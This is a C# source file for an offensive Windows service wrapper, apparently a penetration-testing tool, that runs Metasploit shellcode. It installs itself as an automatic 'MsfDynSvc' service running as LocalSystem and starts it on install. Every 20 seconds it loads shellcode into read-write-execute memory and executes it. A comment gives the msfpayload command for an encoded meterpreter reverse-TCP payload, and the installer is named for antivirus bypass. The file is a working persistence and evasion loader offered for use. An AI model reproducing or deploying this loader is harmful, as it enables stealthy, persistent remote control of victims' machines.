
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;
using System.Timers;
using Timer = System.Timers.Timer;

namespace Wrapper
{
    class Program : ServiceBase
    {
        #region Fields

        private static Timer _timer; 

        #endregion

        #region PInvoke Setup

        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, FreeType dwFreeType);

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        public delegate Int32 ExecuteDelegate(); 

        #endregion

        #region Constructors
        
        public Program()
        {
            ServiceName = "MsfDynSvc";
            _timer = new Timer
                         {
                             Interval = 20000 // 20 seconds
                         };
            _timer.Elapsed += RunShellCode;
            _timer.AutoReset = true;
        }
        
        #endregion

        #region ServiceBase Methods

        protected override void OnStart(string[] args)
        {
            base.OnStart(args);
            _timer.Start();
        }

        protected override void OnStop()
        {
            base.OnStop();
            _timer.Stop();
        }

        #endregion

        static void Main()
        {
            Run(new Program());
        }

        private void RunShellCode(object sender, ElapsedEventArgs e)
        {
            _timer.Stop();
            
            // only run shellcode if you can connect to localhost:445, due to endpoint protections
            if (ConnectToLocalhost(445))
            {
                try
                {
                    // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=<port> LHOST=<host> R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
                    string shellcode = "MSF_PAYLOAD_SPACE";

                    byte[] sc = new byte[shellcode.Length];

                    for (int i = 0; i < shellcode.Length; i++)
                    {
                        sc[i] = Convert.ToByte(shellcode[i]);
                    }

                    // Allocate RWX memory for the shellcode
                    IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                    System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");

                    try
                    {
                        // Copy shellcode to RWX buffer
                        Marshal.Copy(sc, 0, baseAddr, sc.Length);

                        // Get pointer to function created in memory
                        ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));

                        // Run this in a separate thread, so that we can wait for it to die before continuing the timer
                        Thread thread = new Thread(() => del());

                        thread.Start();
                        thread.Join(); // Joins it to the main thread, so that when it ends, execution will continue with main thread
                    }
                    catch
                    {
                        // If the shellcode crashes, try to catch the crash here
                    }
                    finally
                    {
                        VirtualFree(baseAddr, 0, FreeType.MEM_RELEASE);
                    }
                }
                catch
                {
                    // Eat it
                }
            }
            _timer.Start();
        } 

        private static bool ConnectToLocalhost(int port)
        {
            IPAddress localhost = IPAddress.Parse("127.0.0.1");
            TcpClient tcpClient = new TcpClient();

            bool isSuccess = false;
            
            try
            {
                tcpClient.Connect(localhost, port);
                isSuccess = true;
            }
            catch
            {
                // I know this is bad code-fu, but just eat the error
            }
            finally
            {
                if (tcpClient.Connected)
                {
                    tcpClient.Close();    
                }
            }

            return isSuccess;
        }

    }

    [RunInstaller(true)]
    public class DotNetAVBypassServiceInstaller : Installer
    {
        public DotNetAVBypassServiceInstaller()
        {
            var processInstaller = new ServiceProcessInstaller();
            var serviceInstaller = new ServiceInstaller();

            //set the privileges
            processInstaller.Account = ServiceAccount.LocalSystem;

            serviceInstaller.DisplayName = "MsfDynSvc";
            serviceInstaller.StartType = ServiceStartMode.Automatic;

            //must be the same as what was set in Program's constructor
            serviceInstaller.ServiceName = "MsfDynSvc";

            Installers.Add(processInstaller);
            Installers.Add(serviceInstaller);
        }

        public override void Install(System.Collections.IDictionary stateSaver)
        {
            base.Install(stateSaver);
            ServiceController controller = new ServiceController("MsfDynSvc"); // Make sure this name matches the service name!
            controller.Start();
        }
    }
}

